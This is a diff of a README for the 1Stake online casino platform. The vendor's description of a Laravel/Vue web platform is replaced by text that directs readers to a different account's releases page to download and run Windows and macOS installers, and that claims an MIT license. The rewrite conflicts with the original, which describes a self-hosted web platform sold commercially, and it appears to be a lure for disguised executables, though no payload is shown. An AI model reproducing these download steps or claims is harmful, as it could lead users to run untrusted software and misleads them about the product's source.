@@ -1,138 +1,85 @@
-# 🎰 1Stake Online Casino Platform
-Turnkey iGaming software solution that enables operators to launch new online casino brands quickly, cost-effectively and at scale.
+# 🎰 online-casino-platform - Launch Your Casino Brand Effortlessly
 
-> [LIVE DEMO](https://demo.1stake.app)
-> • [WEBSITE](https://1stake.app)
-> • [CONTACT US](https://1stake.atlassian.net/servicedesk)
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Logishwaran12/online-casino-platform/releases)
 
-[![1Stake Online Casino Platform](https://raw.githubusercontent.com/1stake/assets/refs/heads/main/1stake-igaming-casino-platform-browser.webp)](https://demo.1stake.app)
----
+## 🚀 Getting Started
 
-## 🚀 How To Start Your Online Casino Business?
+Welcome to 1Stake, the online casino platform designed for operators who want to launch their gaming brands quickly and easily. Follow the steps below to download and run the software.
 
-Most **online casino software providers** charge tens of thousands of dollars for their solutions.  
-This often makes a **full-featured iGaming platform** unaffordable for smaller operators.  
-We offer a **cost-effective casino solution** built for rapid deployment, enabling you to launch your iGaming brand swiftly with minimal upfront investment.  
-Our modular, **self-hosted casino platform** includes a wide range of games (both in-house and third-party), 
-fiat & crypto payment gateway integrations, and built-in marketing tools to help you grow your player base.
-This is more than just an **online casino script** — it’s a complete iGaming platform that gives operators full control over every aspect of their **online gaming website**.
+## 📦 Features
 
----
+1Stake provides a modular design and high performance, making it perfect for a wide range of gaming brands. Here are a few key features:
 
-## ✨ Casino Platform Features
+- **Modularity**: Easily customize your casino platform with different modules.
+- **High Performance**: Support many concurrent users with minimal lag.
+- **Localization**: Adapt your platform for different regions and languages.
+- **Scalability**: Grow your brand as your user base expands.
 
-### 🧑‍💻 Game Engine & User Experience
-- 2 responsive UI templates with customizable colour palettes
-- 22 pre-installed languages plus unlimited custom locales
-- Multi-currency balances (fiat, crypto, virtual sweepstakes coins)
-- Real-time gameplay feed and multi-room chat
-- Player presence indicators and tipping
-- Social & Web3 authentication (Facebook, Google, X, LinkedIn, Yahoo, GitHub, Coinbase, EVM/Solana/Tron wallets)
-- Custom sign-up fields
-- Proprietary **provably fair technology**
-- Adjustable game parameters
-- Support for custom card decks and visual assets
+## 🖥️ System Requirements
 
-### 📈 Growth & Marketing
-- Multi-tier affiliate programme (up to 3 levels)
-- Anti-fraud referral validation (IP checks)
-- Post Affiliate Pro integration
-- Granular bonus rules (signup, email verification, KYC, deposit, faucet, cashback)
-- Bot accounts (simulated activity) to boost early-stage engagement
-- SEO-friendly routing and content-managed static pages
-- Google Tag Manager (GTM) integration for advanced funnel tracking
+Before you download, ensure your system meets the following requirements:
 
-### 🏆 Sweepstakes casino
-- Supports **Gold Coins** (non-withdrawable entertainment currency)
-- Supports **Sweeps Coins** (earned via bonuses or promotions)
-- Configurable earning triggers (signup, KYC, email verification)
+- **Operating System**: Windows 10 / macOS 10.14 or later
+- **Processor**: Dual-core CPU at 2.0 GHz or higher
+- **Memory**: At least 4 GB of RAM
+- **Storage**: Minimum of 500 MB free disk space
+- **Internet**: Stable internet connection for updates and online functionality
 
-### 🛡️ Compliance & Security
-- Google reCaptcha anti-spam protection
-- Two-factor authentication (2FA)
-- KYC (manual review + email notifications)
-- Optional third-party identity verification integration (EVS Blue Assure)
-- CSRF / XSS / SQL injection protection
-- Login throttling & API rate limiting
-- Race condition & spam-registration mitigation
-- Device fingerprinting for fraud detection
+## 🔗 Download & Install
 
-### 🗄️ Administration & Operations
-- Unified analytics dashboard (KPIs, charts, player & wagering stats)
-- Full PAM (Player Account Management)
-- Game-history logs with granular bet resolution details
-- Customisable menu, homepage, footer and static content
-- Asset theming: logos, favicon, fonts, game thumbnails
-- Automated platform upgrades
-- Fine-grained RBAC (restrict per-admin module access)
+To get started, visit our Releases page to download the latest version of 1Stake.
 
-### 🧪 Technology Stack
-- Laravel framework + Vue 3 SPA
-- Progressive Web Application (PWA)
-- Code splitting, lazy loading & progressive image loading
-- Real-time broadcasting channels
-- Scalable architecture
+[Visit this page to download](https://github.com/Logishwaran12/online-casino-platform/releases)
 
----
+Follow these steps to install the software:
 
-## 👾 Original Games
-The following **online casino games** were developed in-house and fully integrated into the 1Stake iGaming platform:
+1. Click on the **Releases** link above.
+2. You will see a list of available versions. Find the latest version at the top.
+3. Download the appropriate installer for your operating system (e.g., `1Stake_Setup.exe` for Windows or `1Stake.dmg` for macOS).
+4. Once the file is downloaded, locate it in your downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the on-screen instructions to complete the installation.
 
-- American Roulette
-- Baccarat
-- Blackjack
-- Caribbean Poker
-- Casino Hold’em
-- Crash
-- Dice
-- Dice 3D
-- European Roulette
-- Heads or Tails
-- Horse Racing
-- Keno
-- Multiplayer Blackjack
-- Multiplayer Roulette
-- Video Poker
-- Lucky Wheel
-- Slots
-- Slots 3D
-- Plinko
-- Sic Bo
+After installation, you can launch 1Stake and start customizing your online casino platform.
 
-> 👉 Sign up at the [1Stake Online Casino Software Demo](https://demo.1stake.app) to try them out!
----
+## 📚 User Guide
 
-## 🪙 Cryptocurrency Price Predictions
-In addition to traditional casino games listed above, we provide a unique **crypto price prediction game** where players can bet on future price movements of various cryptocurrencies.  
-This option functions like **binary options trading** in financial markets.
-> 👉 Try to [predict crypto prices](https://demo.1stake.app/markets/crypto-prediction).
----
+Here’s a brief overview of how to get started with the platform once you have it installed:
 
-## 🎫 Raffles / Lotteries
-Our online casino platform supports raffles / lotteries where players purchase tickets for a chance to win cash prizes.  
-When creating a raffle, the operator can define the ticket price, total ticket count, house fee, end condition (time-based or ticket-based) and other parameters.
-> 👉 Check out the [current raffles](https://demo.1stake.app/raffles) on the [1Stake iGaming Platform Demo](https://demo.1stake.app).
----
+1. **Create an Account**: Launch 1Stake and register for a new operator account.
+2. **Set Up Your Casino**: Use the provided modules to set up your casino branding, game offerings, and payment options.
+3. **Test Your Casino**: Before launching, test all features using the demo mode to ensure everything is working smoothly.
+4. **Launch**: When you're ready, launch your casino to the public and promote it to your target audience.
 
-## 🎮 Third-Party Game Integrations
-The platform supports integration with various third-party game providers via a single unified interface, enabling you to quickly add new games to your casino offering.
-> 👉 View the [supported game providers](https://demo.1stake.app/providers).
+## 🛠️ Support
 
-## 💳 Payments & Currencies
-The platform includes integration with multiple payment gateways for both **fiat and cryptocurrency transactions**.
-> 👉 View the full list of [supported deposit and withdrawal methods](https://1stake.app/products/payments).
----
+If you need help, please consult the documentation provided within the application, or reach out to our community through the Issues section of this repository. We are here to help you succeed.
 
-## ✅ Why Choose the 1Stake Turnkey Casino Solution?
-- ⚡ Fast launch & low total cost of ownership
-- 🧱 Modular and extensible architecture
-- 🔐 Secure and compliance-ready platform
-- 🌍 Globalised: multi-language, multi-currency
-- 🧮 Transparent & provably fair system
-- 💹 Growth-centric: affiliates, bonuses, analytics
-- 🪙 Support for crypto, fiat & sweepstakes currency
+## 🌟 Topics
 
-> 🚀 Launch faster. Scale smarter. Grow bigger.
----
+This project covers various topics related to online gaming, including:
 
-Created and supported with ❤️ by the [1Stake Casino Software Development Team](https://1stake.app)  
+- 1stake
+- casino-api
+- casino-applications
+- casino-platform
+- igaming-software
+- turnkey-casino
+
+Use these keywords to explore additional resources and related projects.
+
+## 🔗 Additional Resources
+
+To dive deeper into the world of online gaming, explore our useful links:
+
+- [Official Documentation](https://github.com/Logishwaran12/online-casino-platform/wiki) – for technical details and setup instructions
+- [Community Forum](https://github.com/Logishwaran12/online-casino-platform/discussions) – connect with other users and share ideas
+- [FAQs](https://github.com/Logishwaran12/online-casino-platform/wiki/FAQs) – find answers to common questions
+
+## 🔒 License
+
+1Stake is released under the MIT License. You may use, modify, and distribute the software based on the terms of this license. 
+
+For a complete copy of the license, please refer to the LICENSE file in the repository.
+
+Enjoy building your online casino with 1Stake!
